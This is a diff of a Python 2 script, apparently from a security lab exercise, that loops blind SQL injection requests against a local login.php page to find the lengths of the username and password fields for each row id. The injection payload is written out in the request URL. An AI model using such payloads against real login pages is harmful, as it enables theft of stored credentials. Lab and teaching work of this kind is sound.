@@ -17,12 +17,12 @@ from itertools import cycle
 file= open("logs.txt","w+")
 listASCII=string.printable
 iterator=cycle(['username','password'])
-for row in xrange(0,101):
+for row in xrange(1,101):
 	file.write(str(row) + "    ")
 	for iter in xrange(0,2):
 		field=iterator.next()
 		size = 0;
-		for s in xrange(0,100):
+		for s in xrange(0,40):
 			request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%20" + str(row) + "%20AND%20length(" + str(field) + ")%20=%20" + str(s) + "--%20"
 			f = urllib.urlopen(request)
 			response = f.read()
